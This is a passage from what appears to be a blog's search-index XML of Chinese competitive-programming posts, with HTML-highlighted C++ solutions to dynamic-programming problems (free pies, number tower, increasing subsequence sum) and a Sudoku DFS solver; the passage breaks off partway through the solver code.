class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">1010</span>];<span class="comment">//第一个存时间，第二个存位置 </span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1010</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf=<span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF&amp;&amp;n)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> num=<span class="number">-111111111</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]&gt;a[j])&#123;        <span class="comment">//判断是否能跳 </span></span><br><span class="line">                    num=<span class="built_in">max</span>(num,dp[j]);<span class="comment">//判断他的前面和取最大 </span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i]=num+a[i];<span class="comment">//最优+本身 </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">-1111111</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            sum=<span class="built_in">max</span>(sum,dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDU免费馅饼(DP)</title>
      <link href="/2020/03/07/%E5%85%8D%E8%B4%B9%E9%A6%85%E9%A5%BC/"/>
      <url>/2020/03/07/%E5%85%8D%E8%B4%B9%E9%A6%85%E9%A5%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>都说天上不会掉馅饼，但有一天gameboy正走在回家的小径上，忽然天上掉下大把大把的馅饼。说来gameboy的人品实在是太好了，这馅饼别处都不掉，就掉落在他身旁的10米范围内。馅饼如果掉在了地上当然就不能吃了，所以gameboy马上卸下身上的背包去接。但由于小径两侧都不能站人，所以他只能在小径上接。由于gameboy平时老呆在房间里玩游戏，虽然在游戏中是个身手敏捷的高手，但在现实中运动神经特别迟钝，每秒种只有在移动不超过一米的范围内接住坠落的馅饼。现在给这条小径如图标上坐标：<br><img src="/1.jpg"><br>为了使问题简化，假设在接下来的一段时间里，馅饼都掉落在0-10这11个位置。开始时gameboy站在5这个位置，因此在第一秒，他只能接到4,5,6这三个位置中其中一个位置上的馅饼。问gameboy最多可能接到多少个馅饼？（假设他的背包可以容纳无穷多个馅饼）</p><a id="more"></a><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入数据有多组。每组数据的第一行为以正整数n<code>(0&lt;n&lt;100000)</code>，表示有n个馅饼掉在这条小径上。在结下来的n行中，每行有两个整数x,T<code>(0&lt;T&lt;100000)</code>,表示在第T秒有一个馅饼掉在x点上。同一秒钟在同一点上可能掉下多个馅饼。n&#x3D;0时输入结束。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>每一组输入数据对应一行输出。输出一个整数m，表示gameboy最多可能接到m个馅饼。 提示：本题的输入数据量比较大，建议用scanf读入，用cin可能会超时。</p><h2 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">7 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">7 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">8 </span><span class="number">3</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h2><p>4</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><blockquote class="blockquote-center"><p>状态转移方程：dp[i][j]+&#x3D;max(dp[i+1][j],max(dp[i+1][j-1],dp[i+1][j+1]));&#x2F;&#x2F;检查左边，中间，右边<br>从最后两秒开始找，最后到5这个起点</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">100010</span>][<span class="number">15</span>];<span class="comment">//第一个存时间，第二个存位置 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,t,a,b; </span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF&amp;&amp;n)&#123;</span><br><span class="line"><span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;a,&amp;b);</span><br><span class="line">dp[b][a+<span class="number">1</span>]++;</span><br><span class="line">num=<span class="built_in">max</span>(num,b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=num<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">11</span>;j++)&#123;</span><br><span class="line">dp[i][j]+=<span class="built_in">max</span>(dp[i+<span class="number">1</span>][j],<span class="built_in">max</span>(dp[i+<span class="number">1</span>][j<span class="number">-1</span>],dp[i+<span class="number">1</span>][j+<span class="number">1</span>]));<span class="comment">//左边，中间，右边 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,dp[<span class="number">0</span>][<span class="number">6</span>]);<span class="comment">//5为起始点 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数塔问题-动态规划DP</title>
      <link href="/2020/03/06/HDU%E6%95%B0%E5%A1%94%E9%97%AE%E9%A2%98-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92DP/"/>
      <url>/2020/03/06/HDU%E6%95%B0%E5%A1%94%E9%97%AE%E9%A2%98-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92DP/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>动态规划<br>（Dynamic programming）</p></blockquote><a id="more"></a><p id="div-border-left-blue">数塔问题</p><p>有形如下图所示的数塔，从顶部出发，在每一结点可以选择向左走或是向右走，一直走到底层，要求找出一条路径，使路径上的值最大。<br><img src="/1.jpg" alt="数塔"></p><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>输入数据首先包括一个整数C,表示测试实例的个数，每个测试实例的第一行是一个整数N(1 &lt;&#x3D; N &lt;&#x3D; 100)，表示数塔的高度，接下来用N行数字表示数塔，其中第i行有个i个整数，且所有的整数均在区间[0,99]内。</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>对于每个测试实例，输出可能得到的最大和，每个实例的输出占一行。</p><h2 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">8</span></span><br><span class="line"><span class="symbol">8 </span><span class="number">1</span> <span class="number">0</span> </span><br><span class="line"><span class="symbol">2 </span><span class="number">7</span> <span class="number">4</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">5</span> <span class="number">2</span> <span class="number">6</span> <span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h2><p>30</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><blockquote><p>这道题如果用枚举法（暴力思想），在数塔层数稍大的情况下（如31），则需要列举出的路径条数将是一个非常庞大的数目（2^30&#x3D; 1024^3 &gt; 10^9&#x3D;10亿）~~~</p><p>从顶点出发时到底向左走还是向右走应取决于是从左走能取到最大值还是从右走能取到最大值，只要左右两道路径上的最大值求出来了才能作出决策。<br>同样，下一层的走向又要取决于再下一层上的最大值是否已经求出才能决策。这样一层一层推下去，直到倒数第二层时就非常明了。<br>如数字2，只要选择它下面较大值的结点19前进就可以了。所以实际求解时，可从底层开始，层层递进，最后得到最大值。<br>结论：自顶向下的分析，自底向上的计算。</p><footer><strong>David Levithan</strong><cite>Wide Awake</cite></footer></blockquote><p>如果从下(倒数第二层)往上走，每次选最优解，可以少最后一层的步骤~~</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">110</span>][<span class="number">110</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,t; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line"><span class="keyword">while</span>(t--)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;dp[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;      <span class="comment">//每次与下两个取最优</span></span><br><span class="line">dp[i][j]+=<span class="built_in">max</span>(dp[i+<span class="number">1</span>][j],dp[i+<span class="number">1</span>][j+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,dp[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>感谢刘老师</strong></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数独游戏-DFS</title>
      <link href="/2020/03/05/%E6%95%B0%E7%8B%AC%E6%B8%B8%E6%88%8F-DFS/"/>
      <url>/2020/03/05/%E6%95%B0%E7%8B%AC%E6%B8%B8%E6%88%8F-DFS/</url>
      
        <content type="html"><![CDATA[<p><a href="http://acm.oinsm.com/" target="_blank" rel="noopener">欢迎去ZJYYCOJ试试</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>芬兰数学家因卡拉，花费3个月时间设计出了世界上迄今难度最大的数独游戏，而且它只有一个答案。因卡拉说只有思考能力最快、头脑最聪明的人才能破解这个游戏。这是英国《每日邮报》2012年6月30日的一篇报道。<br>作为Acmer的你，能写一个程序解决所有的数独问题吗？</p><p>世界上迄今难度最大的数独游戏：</p><a id="more"></a><p><img src="/1.jpg"></p><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>本题包含多组测试。每组测试会给你一个 9*9 的矩阵，同一行相邻的两个元素用一个空格分开。其中1-9代表该位置的已经填好的数，问号（?）表示需要你填的数。</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>对于每组测试，请输出它的解，同一行相邻的两个数用一个空格分开。两组解之间要一个空行。 如果有多种答案，输出任意一种即可!</p><h2 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">? <span class="number">2</span> <span class="number">6</span> <span class="number">7</span> ? ? <span class="number">5</span> <span class="number">1</span> <span class="number">8</span></span><br><span class="line"><span class="number">7</span> <span class="number">3</span> <span class="number">1</span> ? <span class="number">5</span> <span class="number">8</span> <span class="number">6</span> <span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">5</span> <span class="number">4</span> ? <span class="number">2</span> <span class="number">6</span> <span class="number">1</span> <span class="number">3</span> <span class="number">9</span> <span class="number">7</span></span><br><span class="line"><span class="number">6</span> ? <span class="number">4</span> <span class="number">3</span> <span class="number">7</span> ? ? <span class="number">8</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">8</span> <span class="number">7</span> <span class="number">1</span> <span class="number">9</span> <span class="number">6</span> <span class="number">4</span> <span class="number">3</span> <span class="number">5</span></span><br><span class="line"><span class="number">1</span> <span class="number">9</span> ? ? <span class="number">8</span> <span class="number">4</span> <span class="number">7</span> <span class="number">6</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span> <span class="number">7</span> ? <span class="number">8</span> ? <span class="number">9</span> <span class="number">1</span> <span class="number">4</span> <span class="number">6</span></span><br><span class="line"><span class="number">8</span> ? <span class="number">9</span> <span class="number">4</span> <span class="number">1</span> <span class="number">5</span> <span class="number">2</span> <span class="number">7</span> <span class="number">3</span></span><br><span class="line">? <span class="number">1</span> <span class="number">2</span> <span class="number">6</span> <span class="number">3</span> <span class="number">7</span> <span class="number">8</span> <span class="number">5</span> <span class="number">9</span></span><br><span class="line">? <span class="number">2</span> <span class="number">6</span> <span class="number">7</span> ? ? <span class="number">5</span> <span class="number">1</span> <span class="number">8</span></span><br><span class="line"><span class="number">7</span> <span class="number">3</span> <span class="number">1</span> ? <span class="number">5</span> <span class="number">8</span> <span class="number">6</span> <span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">5</span> <span class="number">4</span> ? <span class="number">2</span> <span class="number">6</span> <span class="number">1</span> <span class="number">3</span> <span class="number">9</span> <span class="number">7</span></span><br><span class="line"><span class="number">6</span> ? <span class="number">4</span> <span class="number">3</span> <span class="number">7</span> ? ? <span class="number">8</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">8</span> <span class="number">7</span> <span class="number">1</span> <span class="number">9</span> <span class="number">6</span> <span class="number">4</span> <span class="number">3</span> <span class="number">5</span></span><br><span class="line"><span class="number">1</span> <span class="number">9</span> ? ? <span class="number">8</span> <span class="number">4</span> <span class="number">7</span> <span class="number">6</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span> <span class="number">7</span> ? <span class="number">8</span> ? <span class="number">9</span> <span class="number">1</span> <span class="number">4</span> <span class="number">6</span></span><br><span class="line"><span class="number">8</span> ? <span class="number">9</span> <span class="number">4</span> <span class="number">1</span> <span class="number">5</span> <span class="number">2</span> <span class="number">7</span> <span class="number">3</span></span><br><span class="line">? <span class="number">1</span> <span class="number">2</span> <span class="number">6</span> <span class="number">3</span> <span class="number">7</span> <span class="number">8</span> <span class="number">5</span> <span class="number">9</span></span><br></pre></td></tr></table></figure><h2 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">9 </span><span class="number">2</span> <span class="number">6</span> <span class="number">7</span> <span class="number">4</span> <span class="number">3</span> <span class="number">5</span> <span class="number">1</span> <span class="number">8</span></span><br><span class="line"><span class="symbol">7 </span><span class="number">3</span> <span class="number">1</span> <span class="number">9</span> <span class="number">5</span> <span class="number">8</span> <span class="number">6</span> <span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">4</span> <span class="number">8</span> <span class="number">2</span> <span class="number">6</span> <span class="number">1</span> <span class="number">3</span> <span class="number">9</span> <span class="number">7</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">7</span> <span class="number">2</span> <span class="number">9</span> <span class="number">8</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">8</span> <span class="number">7</span> <span class="number">1</span> <span class="number">9</span> <span class="number">6</span> <span class="number">4</span> <span class="number">3</span> <span class="number">5</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">9</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">4</span> <span class="number">7</span> <span class="number">6</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">7</span> <span class="number">5</span> <span class="number">8</span> <span class="number">2</span> <span class="number">9</span> <span class="number">1</span> <span class="number">4</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">8 </span><span class="number">6</span> <span class="number">9</span> <span class="number">4</span> <span class="number">1</span> <span class="number">5</span> <span class="number">2</span> <span class="number">7</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">1</span> <span class="number">2</span> <span class="number">6</span> <span class="number">3</span> <span class="number">7</span> <span class="number">8</span> <span class="number">5</span> <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">9 </span><span class="number">2</span> <span class="number">6</span> <span class="number">7</span> <span class="number">4</span> <span class="number">3</span> <span class="number">5</span> <span class="number">1</span> <span class="number">8</span></span><br><span class="line"><span class="symbol">7 </span><span class="number">3</span> <span class="number">1</span> <span class="number">9</span> <span class="number">5</span> <span class="number">8</span> <span class="number">6</span> <span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">4</span> <span class="number">8</span> <span class="number">2</span> <span class="number">6</span> <span class="number">1</span> <span class="number">3</span> <span class="number">9</span> <span class="number">7</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">7</span> <span class="number">2</span> <span class="number">9</span> <span class="number">8</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">8</span> <span class="number">7</span> <span class="number">1</span> <span class="number">9</span> <span class="number">6</span> <span class="number">4</span> <span class="number">3</span> <span class="number">5</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">9</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">4</span> <span class="number">7</span> <span class="number">6</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">7</span> <span class="number">5</span> <span class="number">8</span> <span class="number">2</span> <span class="number">9</span> <span class="number">1</span> <span class="number">4</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">8 </span><span class="number">6</span> <span class="number">9</span> <span class="number">4</span> <span class="number">1</span> <span class="number">5</span> <span class="number">2</span> <span class="number">7</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">1</span> <span class="number">2</span> <span class="number">6</span> <span class="number">3</span> <span class="number">7</span> <span class="number">8</span> <span class="number">5</span> <span class="number">9</span></span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m,a,b,sum,flag;</span><br><span class="line"><span class="keyword">char</span> Map[<span class="number">20</span>][<span class="number">20</span>],n; <span class="comment">//存放数独</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">9</span>;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>,Map[i][j]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %c"</span>,Map[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">char</span> k)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;       <span class="comment">//横竖直线</span></span><br><span class="line"><span class="keyword">if</span>(Map[i][y]==k||Map[x][i]==k)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> x1=x/<span class="number">3</span>*<span class="number">3</span>;<span class="comment">//3*3小矩形 </span></span><br><span class="line"><span class="keyword">int</span> y1=y/<span class="number">3</span>*<span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=x1;i&lt;x1+<span class="number">3</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=y1;j&lt;y1+<span class="number">3</span>;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(Map[i][j]==k)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">9</span>&amp;&amp;y==<span class="number">0</span>)&#123;</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">print</span>();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(Map[x][y]!=<span class="string">'?'</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(y==<span class="number">8</span>)</span><br><span 